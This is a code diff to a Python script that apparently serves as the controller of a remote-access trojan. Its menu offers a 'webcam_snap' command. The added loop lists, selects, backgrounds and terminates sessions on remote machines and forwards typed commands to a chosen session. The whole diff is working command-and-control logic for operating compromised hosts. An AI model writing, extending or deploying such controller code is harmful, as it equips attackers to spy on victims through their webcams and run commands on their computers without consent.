@@ -156,8 +156,54 @@ def start_listening():
     menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
     menu += "========================================================\n"
     print(menu)
+
     l = listen.Listening(host, int(port))
-    l.run()
+    while 1:
+        se = input()
+        if se[:8] == 'sessions':
+            if l.sessions.keys():
+                for k in l.sessions.keys():
+                    print(bcolors.GREEN + f"Session {k} open" + bcolors.ENDC)
+            else:
+                print("No such session")
+        elif se[:10] == "session -d":
+            num = se[11:]
+            try:
+                l.stop(int(num))
+                print(f"stop session {num} sucessful!")
+            except:
+                print("stop failed!")
+        elif se[:10] == "session -t":
+            if not l.sessions.keys():
+                print("No any session..")
+                continue
+            try:
+                l.stop_all()
+                print("stop all sessions sucessful")
+            except:
+                print("teminate failed!")
+        elif se[:7] == "session":
+            if l.sessions.keys():
+                try:
+                    num = se[8:]
+                    ses = l.sessions.get(int(num))
+                    print(f"select session {num}")
+                    parent_conn = ses[0]
+                    while 1:
+                        cmd = input()
+                        if cmd == "exit":
+                            print(bcolors.OCRA + f"session {num} background.." + bcolors.ENDC)
+                            break
+                        else:
+                            parent_conn.send(cmd)
+                except:
+                    print("No such session")
+        else:
+            print("Usage: sessions : check available sessions\n" +
+                  "       session num : open a alive session\n" +
+                  "       session [-d] num : delete a session\n" +
+                  "       session -t : terminate all sessions\n"
+            )
 
 
 if __name__ == '__main__':
